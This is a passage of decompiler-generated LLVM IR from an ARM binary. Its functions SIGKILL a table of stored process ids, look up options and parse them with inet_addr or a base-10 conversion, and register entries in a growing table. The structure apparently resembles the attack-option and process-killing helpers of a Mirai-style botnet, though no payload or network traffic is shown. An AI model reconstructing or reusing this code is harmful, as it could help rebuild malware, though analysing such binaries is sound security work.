  uselistorder i32 %v0_af98, { 1, 0 }
  uselistorder i32 %v0_af34, { 0, 2, 1 }
  uselistorder i32 %v0_af24, { 0, 2, 1, 3 }
  uselistorder i32 %v2_af20, { 0, 1, 2, 8, 7, 6, 3, 5, 9, 10, 4, 11 }
  uselistorder i32 %v3_af04, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_aee0, { 1, 0 }
  uselistorder i32 %v0_aec4, { 0, 2, 1 }
  uselistorder i32 %v0_aea0, { 1, 2, 0, 3 }
  uselistorder i32 %v2_ae94, { 0, 3, 4, 5, 1, 2, 6 }
  uselistorder i32 %v2_ae80, { 2, 1, 0 }
  uselistorder i32 %v4_ae6c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v4_ae60, { 1, 0, 2 }
  uselistorder i32 %v0_ae40, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 6, 3, 4, 5, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 6, 22, 7, 3, 8, 2, 14, 11, 9, 10, 12, 13, 20, 15, 16, 17, 18, 19, 23, 21, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 4, 5, 3, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 %arg2, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_b030, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_ae54, { 1, 0, 3, 4, 2, 5 }
}

define i32 @function_b084(i32 %arg1) local_unnamed_addr {
dec_label_pc_b084:
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_b084 = load i32, i32* @r4, align 4
  store i32 %v3_b084, i32* %stack_var_-12, align 4
  %v6_b084 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1d93c.115 to i32), i32* @r4, align 4
  %v2_b08c = load i32, i32* @global_var_1d93c.115, align 4
  store i32 %v2_b08c, i32* %r0.global-to-local, align 4
  %v2_b090 = icmp eq i32 %v2_b08c, 0
  br i1 %v2_b090, label %dec_label_pc_b098, label %dec_label_pc_b118

dec_label_pc_b098:                                ; preds = %dec_label_pc_b084
  %v3_b098 = load i32, i32* @global_var_1d940.116, align 4
  store i32 %v3_b098, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v2_b0a0 = icmp eq i32 %v3_b098, 0
  store i32 0, i32* @global_var_1d93c.115, align 4
  br i1 %v2_b0a0, label %dec_label_pc_b0ac, label %dec_label_pc_b134

dec_label_pc_b0ac:                                ; preds = %dec_label_pc_b118.dec_label_pc_b0ac_crit_edge, %dec_label_pc_b098
  %v0_b0b4 = phi i32 [ %v0_b0b4.pre, %dec_label_pc_b118.dec_label_pc_b0ac_crit_edge ], [ 0, %dec_label_pc_b098 ]
  %v1_b0b4 = phi i32 [ %v0_b0ac.pre, %dec_label_pc_b118.dec_label_pc_b0ac_crit_edge ], [ ptrtoint (i32* @global_var_1d93c.115 to i32), %dec_label_pc_b098 ]
  %v1_b0ac = add i32 %v1_b0b4, 8
  %v2_b0ac = inttoptr i32 %v1_b0ac to i32*
  %v3_b0ac = load i32, i32* %v2_b0ac, align 4
  store i32 %v3_b0ac, i32* %r0.global-to-local, align 4
  %v2_b0b0 = icmp eq i32 %v3_b0ac, 0
  %v2_b0b4 = add i32 %v1_b0b4, 4
  %v3_b0b4 = inttoptr i32 %v2_b0b4 to i32*
  store i32 %v0_b0b4, i32* %v3_b0b4, align 4
  br i1 %v2_b0b0, label %dec_label_pc_b0bc, label %dec_label_pc_b14c

dec_label_pc_b0bc:                                ; preds = %dec_label_pc_b0ac, %dec_label_pc_b134
  %v0_b0bc = load i32, i32* @r4, align 4
  %v1_b0bc = add i32 %v0_b0bc, 12
  %v2_b0bc = inttoptr i32 %v1_b0bc to i32*
  %v3_b0bc = load i32, i32* %v2_b0bc, align 4
  store i32 %v3_b0bc, i32* %r0.global-to-local, align 4
  %v2_b0c0 = icmp eq i32 %v3_b0bc, 0
  %v0_b0c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b0c4 = add i32 %v0_b0bc, 8
  %v3_b0c4 = inttoptr i32 %v2_b0c4 to i32*
  store i32 %v0_b0c4, i32* %v3_b0c4, align 4
  br i1 %v2_b0c0, label %dec_label_pc_b0cc, label %dec_label_pc_b164

dec_label_pc_b0cc:                                ; preds = %dec_label_pc_b0bc, %dec_label_pc_b14c
  %v0_b0cc = load i32, i32* @r4, align 4
  %v1_b0cc = add i32 %v0_b0cc, 16
  %v2_b0cc = inttoptr i32 %v1_b0cc to i32*
  %v3_b0cc = load i32, i32* %v2_b0cc, align 4
  store i32 %v3_b0cc, i32* %r0.global-to-local, align 4
  %v2_b0d0 = icmp eq i32 %v3_b0cc, 0
  %v0_b0d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b0d4 = add i32 %v0_b0cc, 12
  %v3_b0d4 = inttoptr i32 %v2_b0d4 to i32*
  store i32 %v0_b0d4, i32* %v3_b0d4, align 4
  br i1 %v2_b0d0, label %dec_label_pc_b0dc, label %dec_label_pc_b17c

dec_label_pc_b0dc:                                ; preds = %dec_label_pc_b0cc, %dec_label_pc_b164
  %v0_b0dc = load i32, i32* @r4, align 4
  %v1_b0dc = add i32 %v0_b0dc, 20
  %v2_b0dc = inttoptr i32 %v1_b0dc to i32*
  %v3_b0dc = load i32, i32* %v2_b0dc, align 4
  store i32 %v3_b0dc, i32* %r0.global-to-local, align 4
  %v2_b0e0 = icmp eq i32 %v3_b0dc, 0
  %v0_b0e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b0e4 = add i32 %v0_b0dc, 16
  %v3_b0e4 = inttoptr i32 %v2_b0e4 to i32*
  store i32 %v0_b0e4, i32* %v3_b0e4, align 4
  br i1 %v2_b0e0, label %dec_label_pc_b0ec, label %dec_label_pc_b194

dec_label_pc_b0ec:                                ; preds = %dec_label_pc_b0dc, %dec_label_pc_b17c
  %v0_b0ec = load i32, i32* @r4, align 4
  %v1_b0ec = add i32 %v0_b0ec, 24
  %v2_b0ec = inttoptr i32 %v1_b0ec to i32*
  %v3_b0ec = load i32, i32* %v2_b0ec, align 4
  store i32 %v3_b0ec, i32* %r0.global-to-local, align 4
  %v2_b0f0 = icmp eq i32 %v3_b0ec, 0
  %v0_b0f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b0f4 = add i32 %v0_b0ec, 20
  %v3_b0f4 = inttoptr i32 %v2_b0f4 to i32*
  store i32 %v0_b0f4, i32* %v3_b0f4, align 4
  br i1 %v2_b0f0, label %dec_label_pc_b0fc, label %dec_label_pc_b1ac

dec_label_pc_b0fc:                                ; preds = %dec_label_pc_b0ec, %dec_label_pc_b194
  %v0_b0fc = load i32, i32* @r4, align 4
  %v1_b0fc = add i32 %v0_b0fc, 28
  %v2_b0fc = inttoptr i32 %v1_b0fc to i32*
  %v3_b0fc = load i32, i32* %v2_b0fc, align 4
  store i32 %v3_b0fc, i32* %r0.global-to-local, align 4
  %v2_b100 = icmp eq i32 %v3_b0fc, 0
  %v0_b104 = load i32, i32* %r5.global-to-local, align 4
  %v2_b104 = add i32 %v0_b0fc, 24
  %v3_b104 = inttoptr i32 %v2_b104 to i32*
  store i32 %v0_b104, i32* %v3_b104, align 4
  br i1 %v2_b100, label %dec_label_pc_b10c, label %dec_label_pc_b1c4

dec_label_pc_b10c:                                ; preds = %dec_label_pc_b0fc, %dec_label_pc_b1ac, %dec_label_pc_b1c4
  %v0_b10c = load i32, i32* %r5.global-to-local, align 4
  %v1_b10c = load i32, i32* @r4, align 4
  %v2_b10c = add i32 %v1_b10c, 28
  %v3_b10c = inttoptr i32 %v2_b10c to i32*
  store i32 %v0_b10c, i32* %v3_b10c, align 4
  %v2_b110 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_b110, i32* @r4, align 4
  store i32 %v6_b084, i32* @r5, align 4
  %v0_b114 = call i32 @function_12298()
  store i32 %v0_b114, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b118

dec_label_pc_b118:                                ; preds = %dec_label_pc_b084, %dec_label_pc_b10c
  %v0_b11c = phi i32 [ %v2_b08c, %dec_label_pc_b084 ], [ %v0_b114, %dec_label_pc_b10c ]
  %v2_b11c = call i32 @_kill(i32 %v0_b11c, i32 9)
  store i32 %v2_b11c, i32* %r0.global-to-local, align 4
  %v0_b120 = load i32, i32* @r4, align 4
  %v1_b120 = add i32 %v0_b120, 4
  %v2_b120 = inttoptr i32 %v1_b120 to i32*
  %v3_b120 = load i32, i32* %v2_b120, align 4
  store i32 %v3_b120, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v2_b128 = icmp eq i32 %v3_b120, 0
  %v2_b12c = inttoptr i32 %v0_b120 to i32*
  store i32 0, i32* %v2_b12c, align 4
  br i1 %v2_b128, label %dec_label_pc_b118.dec_label_pc_b0ac_crit_edge, label %dec_label_pc_b118.dec_label_pc_b134_crit_edge

dec_label_pc_b118.dec_label_pc_b134_crit_edge:    ; preds = %dec_label_pc_b118
  %v0_b138.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b134

dec_label_pc_b118.dec_label_pc_b0ac_crit_edge:    ; preds = %dec_label_pc_b118
  %v0_b0ac.pre = load i32, i32* @r4, align 4
  %v0_b0b4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_b0ac

dec_label_pc_b134:                                ; preds = %dec_label_pc_b118.dec_label_pc_b134_crit_edge, %dec_label_pc_b098
  %v0_b138 = phi i32 [ %v0_b138.pre, %dec_label_pc_b118.dec_label_pc_b134_crit_edge ], [ %v3_b098, %dec_label_pc_b098 ]
  %v2_b138 = call i32 @_kill(i32 %v0_b138, i32 9)
  store i32 %v2_b138, i32* %r0.global-to-local, align 4
  %v0_b13c = load i32, i32* @r4, align 4
  %v1_b13c = add i32 %v0_b13c, 8
  %v2_b13c = inttoptr i32 %v1_b13c to i32*
  %v3_b13c = load i32, i32* %v2_b13c, align 4
  store i32 %v3_b13c, i32* %r0.global-to-local, align 4
  %v2_b140 = icmp eq i32 %v3_b13c, 0
  %v0_b144 = load i32, i32* %r5.global-to-local, align 4
  %v2_b144 = add i32 %v0_b13c, 4
  %v3_b144 = inttoptr i32 %v2_b144 to i32*
  store i32 %v0_b144, i32* %v3_b144, align 4
  br i1 %v2_b140, label %dec_label_pc_b0bc, label %dec_label_pc_b14c

dec_label_pc_b14c:                                ; preds = %dec_label_pc_b0ac, %dec_label_pc_b134
  %v0_b150 = load i32, i32* %r0.global-to-local, align 4
  %v2_b150 = call i32 @_kill(i32 %v0_b150, i32 9)
  store i32 %v2_b150, i32* %r0.global-to-local, align 4
  %v0_b154 = load i32, i32* @r4, align 4
  %v1_b154 = add i32 %v0_b154, 12
  %v2_b154 = inttoptr i32 %v1_b154 to i32*
  %v3_b154 = load i32, i32* %v2_b154, align 4
  store i32 %v3_b154, i32* %r0.global-to-local, align 4
  %v2_b158 = icmp eq i32 %v3_b154, 0
  %v0_b15c = load i32, i32* %r5.global-to-local, align 4
  %v2_b15c = add i32 %v0_b154, 8
  %v3_b15c = inttoptr i32 %v2_b15c to i32*
  store i32 %v0_b15c, i32* %v3_b15c, align 4
  br i1 %v2_b158, label %dec_label_pc_b0cc, label %dec_label_pc_b164

dec_label_pc_b164:                                ; preds = %dec_label_pc_b0bc, %dec_label_pc_b14c
  %v0_b168 = load i32, i32* %r0.global-to-local, align 4
  %v2_b168 = call i32 @_kill(i32 %v0_b168, i32 9)
  store i32 %v2_b168, i32* %r0.global-to-local, align 4
  %v0_b16c = load i32, i32* @r4, align 4
  %v1_b16c = add i32 %v0_b16c, 16
  %v2_b16c = inttoptr i32 %v1_b16c to i32*
  %v3_b16c = load i32, i32* %v2_b16c, align 4
  store i32 %v3_b16c, i32* %r0.global-to-local, align 4
  %v2_b170 = icmp eq i32 %v3_b16c, 0
  %v0_b174 = load i32, i32* %r5.global-to-local, align 4
  %v2_b174 = add i32 %v0_b16c, 12
  %v3_b174 = inttoptr i32 %v2_b174 to i32*
  store i32 %v0_b174, i32* %v3_b174, align 4
  br i1 %v2_b170, label %dec_label_pc_b0dc, label %dec_label_pc_b17c

dec_label_pc_b17c:                                ; preds = %dec_label_pc_b0cc, %dec_label_pc_b164
  %v0_b180 = load i32, i32* %r0.global-to-local, align 4
  %v2_b180 = call i32 @_kill(i32 %v0_b180, i32 9)
  store i32 %v2_b180, i32* %r0.global-to-local, align 4
  %v0_b184 = load i32, i32* @r4, align 4
  %v1_b184 = add i32 %v0_b184, 20
  %v2_b184 = inttoptr i32 %v1_b184 to i32*
  %v3_b184 = load i32, i32* %v2_b184, align 4
  store i32 %v3_b184, i32* %r0.global-to-local, align 4
  %v2_b188 = icmp eq i32 %v3_b184, 0
  %v0_b18c = load i32, i32* %r5.global-to-local, align 4
  %v2_b18c = add i32 %v0_b184, 16
  %v3_b18c = inttoptr i32 %v2_b18c to i32*
  store i32 %v0_b18c, i32* %v3_b18c, align 4
  br i1 %v2_b188, label %dec_label_pc_b0ec, label %dec_label_pc_b194

dec_label_pc_b194:                                ; preds = %dec_label_pc_b0dc, %dec_label_pc_b17c
  %v0_b198 = load i32, i32* %r0.global-to-local, align 4
  %v2_b198 = call i32 @_kill(i32 %v0_b198, i32 9)
  store i32 %v2_b198, i32* %r0.global-to-local, align 4
  %v0_b19c = load i32, i32* @r4, align 4
  %v1_b19c = add i32 %v0_b19c, 24
  %v2_b19c = inttoptr i32 %v1_b19c to i32*
  %v3_b19c = load i32, i32* %v2_b19c, align 4
  store i32 %v3_b19c, i32* %r0.global-to-local, align 4
  %v2_b1a0 = icmp eq i32 %v3_b19c, 0
  %v0_b1a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b1a4 = add i32 %v0_b19c, 20
  %v3_b1a4 = inttoptr i32 %v2_b1a4 to i32*
  store i32 %v0_b1a4, i32* %v3_b1a4, align 4
  br i1 %v2_b1a0, label %dec_label_pc_b0fc, label %dec_label_pc_b1ac

dec_label_pc_b1ac:                                ; preds = %dec_label_pc_b0ec, %dec_label_pc_b194
  %v0_b1b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_b1b0 = call i32 @_kill(i32 %v0_b1b0, i32 9)
  store i32 %v2_b1b0, i32* %r0.global-to-local, align 4
  %v0_b1b4 = load i32, i32* @r4, align 4
  %v1_b1b4 = add i32 %v0_b1b4, 28
  %v2_b1b4 = inttoptr i32 %v1_b1b4 to i32*
  %v3_b1b4 = load i32, i32* %v2_b1b4, align 4
  store i32 %v3_b1b4, i32* %r0.global-to-local, align 4
  %v2_b1b8 = icmp eq i32 %v3_b1b4, 0
  %v0_b1bc = load i32, i32* %r5.global-to-local, align 4
  %v2_b1bc = add i32 %v0_b1b4, 24
  %v3_b1bc = inttoptr i32 %v2_b1bc to i32*
  store i32 %v0_b1bc, i32* %v3_b1bc, align 4
  br i1 %v2_b1b8, label %dec_label_pc_b10c, label %dec_label_pc_b1c4

dec_label_pc_b1c4:                                ; preds = %dec_label_pc_b0fc, %dec_label_pc_b1ac
  %v0_b1c8 = load i32, i32* %r0.global-to-local, align 4
  %v2_b1c8 = call i32 @_kill(i32 %v0_b1c8, i32 9)
  store i32 %v2_b1c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b10c

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 11, 12, 13, 2, 3, 4, 0, 1, 7, 5, 6, 8, 9, 10, 14 }
  uselistorder i32* %r0.global-to-local, { 26, 24, 25, 29, 27, 28, 30, 12, 0, 2, 14, 1, 4, 16, 3, 6, 18, 5, 9, 7, 8, 23, 22, 10, 11, 13, 15, 17, 19, 20, 21 }
  uselistorder label %dec_label_pc_b1c4, { 1, 0 }
  uselistorder label %dec_label_pc_b1ac, { 1, 0 }
  uselistorder label %dec_label_pc_b194, { 1, 0 }
  uselistorder label %dec_label_pc_b17c, { 1, 0 }
  uselistorder label %dec_label_pc_b164, { 1, 0 }
  uselistorder label %dec_label_pc_b14c, { 1, 0 }
  uselistorder label %dec_label_pc_b118, { 1, 0 }
  uselistorder label %dec_label_pc_b10c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b0fc, { 1, 0 }
  uselistorder label %dec_label_pc_b0ec, { 1, 0 }
  uselistorder label %dec_label_pc_b0dc, { 1, 0 }
  uselistorder label %dec_label_pc_b0cc, { 1, 0 }
  uselistorder label %dec_label_pc_b0bc, { 1, 0 }
}

define i32 @function_b1d4(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_b1d4:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_b1d4 = urem i32 %arg1, 256
  %v2_b1d8 = icmp eq i32 %v1_b1d4, 0
  br i1 %v2_b1d8, label %dec_label_pc_b224, label %dec_label_pc_b1e8

dec_label_pc_b1e8:                                ; preds = %dec_label_pc_b1d4
  %v0_b1e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b1e8 = add i32 %v0_b1e8, 4
  %v2_b1e8 = inttoptr i32 %v1_b1e8 to i8*
  %v3_b1e8 = load i8, i8* %v2_b1e8, align 1
  %v4_b1e8 = zext i8 %v3_b1e8 to i32
  %v1_b1ec = urem i32 %arg3, 256
  %v9_b1f0 = icmp eq i32 %v4_b1e8, %v1_b1ec
  br i1 %v9_b1f0, label %dec_label_pc_b22c, label %dec_label_pc_b214.preheader

dec_label_pc_b214.preheader:                      ; preds = %dec_label_pc_b1e8
  br label %dec_label_pc_b214

dec_label_pc_b204:                                ; preds = %dec_label_pc_b214
  %v1_b204 = add i32 %v0_b20c.in, 12
  %v2_b204 = inttoptr i32 %v1_b204 to i8*
  %v3_b204 = load i8, i8* %v2_b204, align 1
  %v4_b204 = zext i8 %v3_b204 to i32
  %v9_b208 = icmp eq i32 %v1_b1ec, %v4_b204
  br i1 %v9_b208, label %dec_label_pc_b22c, label %dec_label_pc_b214

dec_label_pc_b214:                                ; preds = %dec_label_pc_b214.preheader, %dec_label_pc_b204
  %v0_b20c.in = phi i32 [ %v0_b1e8, %dec_label_pc_b214.preheader ], [ %v0_b20c, %dec_label_pc_b204 ]
  %v0_b214 = phi i32 [ 0, %dec_label_pc_b214.preheader ], [ %v1_b214, %dec_label_pc_b204 ]
  %v0_b20c = add i32 %v0_b20c.in, 8
  %v1_b214 = add i32 %v0_b214, 1
  %v9_b218 = icmp eq i32 %v1_b1d4, %v1_b214
  store i32 %v0_b20c, i32* %r1.global-to-local, align 4
  br i1 %v9_b218, label %dec_label_pc_b224, label %dec_label_pc_b204

dec_label_pc_b224:                                ; preds = %dec_label_pc_b214, %dec_label_pc_b22c, %dec_label_pc_b1d4
  ret i32 %arg4

dec_label_pc_b22c:                                ; preds = %dec_label_pc_b204, %dec_label_pc_b1e8
  %v0_b22c = phi i32 [ %v0_b1e8, %dec_label_pc_b1e8 ], [ %v0_b20c, %dec_label_pc_b204 ]
  %v1_b22c = inttoptr i32 %v0_b22c to i32*
  %v2_b22c = load i32, i32* %v1_b22c, align 4
  %v2_b230 = icmp eq i32 %v2_b22c, 0
  br i1 %v2_b230, label %dec_label_pc_b224, label %dec_label_pc_b238

dec_label_pc_b238:                                ; preds = %dec_label_pc_b22c
  %v1_b23c = call i32 @_inet_addr(i32 %v2_b22c)
  ret i32 %v1_b23c

; uselistorder directives
  uselistorder i32 %v1_b214, { 1, 0 }
  uselistorder i32 %v0_b20c, { 1, 0, 2 }
  uselistorder i32 %v0_b20c.in, { 1, 0 }
  uselistorder i32 %v1_b1ec, { 1, 0 }
  uselistorder i32 %v0_b1e8, { 1, 0, 2 }
  uselistorder i32 %v1_b1d4, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b224, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b214, { 1, 0 }
}

define i32 @function_b240(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b240:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_b240 = urem i32 %arg1, 256
  %v2_b244 = icmp eq i32 %v1_b240, 0
  %v3_b248 = load i32, i32* @r4, align 4
  br i1 %v2_b244, label %dec_label_pc_b290, label %dec_label_pc_b254

dec_label_pc_b254:                                ; preds = %dec_label_pc_b240
  %v0_b254 = load i32, i32* %r1.global-to-local, align 4
  %v1_b254 = add i32 %v0_b254, 4
  %v2_b254 = inttoptr i32 %v1_b254 to i8*
  %v3_b254 = load i8, i8* %v2_b254, align 1
  %v4_b254 = zext i8 %v3_b254 to i32
  %v1_b258 = urem i32 %arg3, 256
  %v9_b25c = icmp eq i32 %v4_b254, %v1_b258
  br i1 %v9_b25c, label %dec_label_pc_b298, label %dec_label_pc_b280.preheader

dec_label_pc_b280.preheader:                      ; preds = %dec_label_pc_b254
  br label %dec_label_pc_b280

dec_label_pc_b270:                                ; preds = %dec_label_pc_b280
  %v1_b270 = add i32 %v0_b278.in, 12
  %v2_b270 = inttoptr i32 %v1_b270 to i8*
  %v3_b270 = load i8, i8* %v2_b270, align 1
  %v4_b270 = zext i8 %v3_b270 to i32
  %v9_b274 = icmp eq i32 %v1_b258, %v4_b270
  br i1 %v9_b274, label %dec_label_pc_b298, label %dec_label_pc_b280

dec_label_pc_b280:                                ; preds = %dec_label_pc_b280.preheader, %dec_label_pc_b270
  %v0_b278.in = phi i32 [ %v0_b254, %dec_label_pc_b280.preheader ], [ %v0_b278, %dec_label_pc_b270 ]
  %v0_b280 = phi i32 [ 0, %dec_label_pc_b280.preheader ], [ %v1_b280, %dec_label_pc_b270 ]
  %v0_b278 = add i32 %v0_b278.in, 8
  %v1_b280 = add i32 %v0_b280, 1
  store i32 %v1_b280, i32* @lr, align 4
  %v9_b284 = icmp eq i32 %v1_b240, %v1_b280
  store i32 %v0_b278, i32* %r1.global-to-local, align 4
  br i1 %v9_b284, label %dec_label_pc_b290, label %dec_label_pc_b270

dec_label_pc_b290:                                ; preds = %dec_label_pc_b280, %dec_label_pc_b298, %dec_label_pc_b240
  store i32 %v3_b248, i32* @r4, align 4
  ret i32 %arg4

dec_label_pc_b298:                                ; preds = %dec_label_pc_b270, %dec_label_pc_b254
  %v0_b298 = phi i32 [ %v0_b254, %dec_label_pc_b254 ], [ %v0_b278, %dec_label_pc_b270 ]
  %v1_b298 = inttoptr i32 %v0_b298 to i32*
  %v2_b298 = load i32, i32* %v1_b298, align 4
  %v2_b29c = icmp eq i32 %v2_b298, 0
  br i1 %v2_b29c, label %dec_label_pc_b290, label %dec_label_pc_b2a4

dec_label_pc_b2a4:                                ; preds = %dec_label_pc_b298
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v3_b248, i32* @r4, align 4
  %v2_b2ac = inttoptr i32 %v2_b298 to i8*
  %v3_b2ac = call i32 @function_14738(i8* %v2_b2ac, i32 10)
  ret i32 %v3_b2ac

; uselistorder directives
  uselistorder i32 %v1_b280, { 1, 2, 0 }
  uselistorder i32 %v0_b278, { 1, 0, 2 }
  uselistorder i32 %v0_b278.in, { 1, 0 }
  uselistorder i32 %v1_b258, { 1, 0 }
  uselistorder i32 %v0_b254, { 1, 0, 2 }
  uselistorder i32 %v3_b248, { 1, 0 }
  uselistorder i32 %v1_b240, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_b290, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b280, { 1, 0 }
}

define i32 @function_b2b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_b2b0:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_b2b0 = load i32, i32* @r4, align 4
  store i32 %v3_b2b0, i32* %stack_var_-20, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_b2bc = call i32 @_calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_1d934.109 to i32), i32* %r4.global-to-local, align 4
  %v2_b2c4 = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b2c4 = zext i8 %v2_b2c4 to i32
  store i32 ptrtoint (i32* @global_var_1d938.111 to i32), i32* %r6.global-to-local, align 4
  store i32 60064, i32* %r2.global-to-local, align 4
  store i32 %v2_b2bc, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b2d8 = mul nuw nsw i32 %v3_b2c4, 4
  store i32 %v3_b2d8, i32* %r1.global-to-local, align 4
  %v2_b2dc = load i32, i32* @global_var_1d938.111, align 4
  %v2_b2e0 = inttoptr i32 %v2_b2bc to i32*
  store i32 60064, i32* %v2_b2e0, align 4
  %v3_b2e4 = load i32, i32* %r5.global-to-local, align 4
  %v4_b2e4 = add i32 %v3_b2e4, 4
  %v5_b2e4 = inttoptr i32 %v4_b2e4 to i8*
  store i8 0, i8* %v5_b2e4, align 1
  %v0_b2e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2e8 = add i32 %v0_b2e8, 4
  store i32 %v1_b2e8, i32* %r1.global-to-local, align 4
  %v5_b2ec = call i32 @_realloc(i32 %v2_b2dc, i32 %v1_b2e8, i32 60064, i32 0)
  %v2_b2f0 = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b2f0 = zext i8 %v2_b2f0 to i32
  store i32 %v3_b2f0, i32* %r3.global-to-local, align 4
  store i32 %v5_b2ec, i32* %ip.global-to-local, align 4
  %v0_b2f8 = load i32, i32* %r5.global-to-local, align 4
  %v5_b2f8 = mul nuw nsw i32 %v3_b2f0, 4
  %v6_b2f8 = add i32 %v5_b2f8, %v5_b2ec
  %v7_b2f8 = inttoptr i32 %v6_b2f8 to i32*
  store i32 %v0_b2f8, i32* %v7_b2f8, align 4
  store i32 ptrtoint (i8* @global_var_1d935.120 to i32), i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v3_b308 = load i32, i32* %r4.global-to-local, align 4
  %v4_b308 = inttoptr i32 %v3_b308 to i8*
  store i8 ptrtoint (i8* @global_var_1d935.120 to i8), i8* %v4_b308, align 1
  %v0_b30c = load i32, i32* %ip.global-to-local, align 4
  %v1_b30c = load i32, i32* %r6.global-to-local, align 4
  %v2_b30c = inttoptr i32 %v1_b30c to i32*
  store i32 %v0_b30c, i32* %v2_b30c, align 4
  %v2_b310 = call i32 @_calloc(i32 1, i32 8)
  %v2_b314 = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b314 = zext i8 %v2_b314 to i32
  store i32 ptrtoint (i32* @global_var_f12c.122 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i32 %v2_b310, i32* %r5.global-to-local, align 4
  %v3_b324 = mul nuw nsw i32 %v3_b314, 4
  store i32 %v3_b324, i32* %r1.global-to-local, align 4
  %v2_b328 = load i32, i32* @global_var_1d938.111, align 4
  %v2_b32c = inttoptr i32 %v2_b310 to i32*
  store i32 ptrtoint (i32* @global_var_f12c.122 to i32), i32* %v2_b32c, align 4
  %v0_b330 = load i32, i32* %r7.global-to-local, align 4
  %v1_b330 = trunc i32 %v0_b330 to i8
  %v2_b330 = load i32, i32* %r5.global-to-local, align 4
  %v3_b330 = add i32 %v2_b330, 4
  %v4_b330 = inttoptr i32 %v3_b330 to i8*
  store i8 %v1_b330, i8* %v4_b330, align 1
  %v0_b334 = load i32, i32* %r1.global-to-local, align 4
  %v1_b334 = add i32 %v0_b334, 4
  store i32 %v1_b334, i32* %r1.global-to-local, align 4
  %v5_b338 = call i32 @_realloc(i32 %v2_b328, i32 %v1_b334, i32 sext (i8 ptrtoint (i8* @global_var_1d935.120 to i8) to i32), i32 ptrtoint (i32* @global_var_f12c.122 to i32))
  %v2_b33c = load i8, i8* bitcast (i8** @global_var_1d934.109 to i8*), align 4
  %v3_b33c = zext i8 %v2_b33c to i32
  store i32 %v3_b33c, i32* %r3.global-to-local, align 4
  store i32 %v5_b338, i32* %ip.global-to-local, align 4
  %v0_b344 = load i32, i32* %r5.global-to-local, align 4
  %v5_b344 = mul nuw nsw i32 %v3_b33c, 4
  %v6_b344 = add i32 %v5_b344, %v5_b338
  %v7_b344 = inttoptr i32 %v6_b344 to i32*
  store i32 %v0_b344, i32* %v7_b344, align 4
  %v0_b348 = load i32, i32* %r3.global-to-local, align 4
  %v1_b348 = load i32, i32* %r7.global-to-local, align 4
  %v2_b348 = add i32 %v1_b348, %v0_b348
  store i32 %v2_b348, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b354 = load i32, i32* %ip.global-to-local, align 4
